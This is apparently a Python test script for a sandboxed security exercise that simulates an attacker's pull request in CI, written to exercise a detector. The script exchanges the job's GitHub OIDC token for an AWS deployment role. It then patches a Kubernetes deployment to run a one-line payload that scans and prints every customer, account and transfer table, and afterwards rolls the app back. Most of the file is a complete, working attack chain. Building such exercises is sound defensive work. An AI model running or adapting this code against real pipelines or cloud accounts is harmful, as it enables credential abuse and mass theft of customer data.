"""PR-editable test entrypoint for the D2 exercise.

This file stands in for attacker-controlled code that runs in CI. In the real scenario an
attacker who stole a developer's AI-coding-agent GitHub token edits a build/test script in a
pull request; the PR's automated tests execute it *before* anyone reviews the change.

What it does:
  - Always: obtain the AWS "deployment" identity by exchanging the job's GitHub OIDC token
    (this is the credential grab the D2 detector watches for).
  - On a pull request only: use that identity to carry out the rest of the attack in CI —
    replace the running app with a container that dumps the customer tables, print what it
    stole, then restore the app.

Everything is synthetic data in an owned sandbox; nothing leaves the cluster.
"""

import json
import os
import subprocess
import time
import urllib.parse
import urllib.request
from datetime import UTC, datetime

import boto3
from botocore import UNSIGNED
from botocore.config import Config

# Marker the attacker edits to make the PR trigger CI. Its value is irrelevant to the attack.
MARKER = "original-harmless-probe"

# -- Payload that runs INSIDE the hijacked app pod -----------------------------------------------
# It runs as the app's own identity (via EKS Pod Identity), which has read access to the tables.
# A real attacker does NOT know the primary keys, so they do not GetItem specific rows — they
# enumerate the whole table with Scan and take everything. This is a one-line program passed to
# `python -c '...'`, so it may contain only double quotes (it is shell single-quoted below).
READER = (
    "import boto3,os,json;"
    'd=boto3.client("dynamodb",region_name=os.environ.get("AWS_REGION","us-east-1"));'
    'print("STOLEN CUSTOMER RECORDS:");'
    # For each table the app knows (names come from the pod's own environment), page through a
    # full Scan and dump every item — the attacker takes the lot without knowing any keys.
    '[print(json.dumps({"table":os.environ[e],'
    '"items":[i for pg in d.get_paginator("scan").paginate(TableName=os.environ[e]) '
    'for i in pg["Items"]]})) '
    'for e in ("CUSTOMERS_TABLE","ACCOUNTS_TABLE","TRANSFERS_TABLE") if os.environ.get(e)];'
    'print("---END---")'
)


def web_identity_token() -> str:
    """Ask GitHub for this job's OIDC token (identity of the workflow run), audience = AWS STS."""
    parsed = urllib.parse.urlparse(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"])
    query = urllib.parse.parse_qsl(parsed.query) + [("audience", "sts.amazonaws.com")]
    url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
    request = urllib.request.Request(url, headers={
        "Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"],
    })
    with urllib.request.urlopen(request, timeout=20) as response:
        return json.load(response)["value"]


def obtain_identity(region: str) -> dict:
    """Exchange the GitHub OIDC token for the deployment role's temporary AWS credentials.

    This is the heart of D2: an unreviewed PR job calling sts:AssumeRoleWithWebIdentity and AWS
    accepting it because the role's trust policy allows the pull_request context. Once the trust
    is fixed (prevention), this call fails with AccessDenied and the attack stops right here.
    """
    sts = boto3.client("sts", region_name=region, config=Config(signature_version=UNSIGNED))
    return sts.assume_role_with_web_identity(
        RoleArn=os.environ["D2_DEMO_ROLE_ARN"],
        # A deliberately release-looking session name, to show the detector ignores it.
        RoleSessionName=os.environ.get("D2_SESSION_NAME", "release-looking-demo"),
        WebIdentityToken=web_identity_token(), DurationSeconds=900,
    )["Credentials"]


def exploit(credentials: dict, region: str):
    """Use the stolen deployment identity to reach customer data, in CI.

    The deployment identity cannot read the database directly, but it can replace the app. The
    app's pods run as an identity that *can* read the tables, so swapping the app's container for
    a data-dumper inherits that access — the pivot from 'deploy' to 'data'.
    """
    # Hand the stolen temporary credentials to the aws/kubectl subprocesses via the environment.
    env = {**os.environ, "AWS_ACCESS_KEY_ID": credentials["AccessKeyId"],
           "AWS_SECRET_ACCESS_KEY": credentials["SecretAccessKey"],
           "AWS_SESSION_TOKEN": credentials["SessionToken"],
           "AWS_REGION": region, "AWS_DEFAULT_REGION": region}
    cluster = os.environ["EKS_CLUSTER_NAME"]

    # 1) Point kubectl at the cluster's API (reachable from CI); auth is the stolen identity,
    #    which EKS maps to the mybank:deployers group (allowed to change the app's Deployment).
    subprocess.run(["aws", "eks", "update-kubeconfig", "--name", cluster, "--region", region],
                   env=env, check=True)

    # 2) Replace the app container's command with the READER above, and strip the health probes
    #    (a data-dumper does not serve HTTP) so the pod is not killed. Same service account, so
    #    the new pod keeps the app's data-reading Pod Identity.
    patch = {"spec": {"template": {"spec": {"containers": [{
        "name": "api", "command": ["sh", "-c", f"python -c '{READER}'; sleep 3600"],
        "livenessProbe": None, "readinessProbe": None, "startupProbe": None,
    }]}}}}
    subprocess.run(["kubectl", "-n", "mybank", "patch", "deployment", "mybank-api",
                    "--type", "strategic", "-p", json.dumps(patch)], env=env, check=True)
    print("Replaced mybank-api with a table-dumping container; waiting for it to run...",
          flush=True)

    # 3) Read the dumped records back from the pod's log (deployers may read logs). In a real
    #    attack the malicious container would ship the data out itself; here we just surface it.
    records = ""
    for _ in range(18):
        time.sleep(10)
        result = subprocess.run(
            ["kubectl", "-n", "mybank", "logs", "-l", "app.kubernetes.io/name=mybank-api",
             "--tail=50"], env=env, capture_output=True, text=True)
        if "STOLEN CUSTOMER RECORDS" in result.stdout:
            records = result.stdout
            break
    print(records or "(no records captured yet)", flush=True)

    # 4) Roll the app back to the real image so the lab is clean for the next run.
    subprocess.run(["kubectl", "-n", "mybank", "rollout", "undo", "deployment/mybank-api"],
                   env=env, check=False)
    subprocess.run(["kubectl", "-n", "mybank", "rollout", "status", "deployment/mybank-api",
                    "--timeout=180s"], env=env, check=False)
    print("Restored the legitimate app.", flush=True)


def main():
    region = os.environ.get("AWS_REGION", "us-east-1")

    # Step A — the credential grab (always). Fails with AccessDenied once the trust is fixed.
    credentials = obtain_identity(region)
    identity = boto3.client(
        "sts", region_name=region, aws_access_key_id=credentials["AccessKeyId"],
        aws_secret_access_key=credentials["SecretAccessKey"],
        aws_session_token=credentials["SessionToken"]).get_caller_identity()
    print(json.dumps({"marker": MARKER, "obtained_identity": identity["Arn"],
                      "attempt_utc": datetime.now(UTC).isoformat()}), flush=True)

    # Step B — the rest of the attack, only when this is a pull request. On main (a trusted
    # release context) we never touch the app; we only prove the identity was obtained.
    if os.environ.get("GITHUB_EVENT_NAME") == "pull_request":
        print("PR context: using the stolen identity to replace the app and dump the tables.",
              flush=True)
        exploit(credentials, region)
    else:
        print("Non-PR context: identity proof only; not modifying the app.", flush=True)


if __name__ == "__main__":
    main()
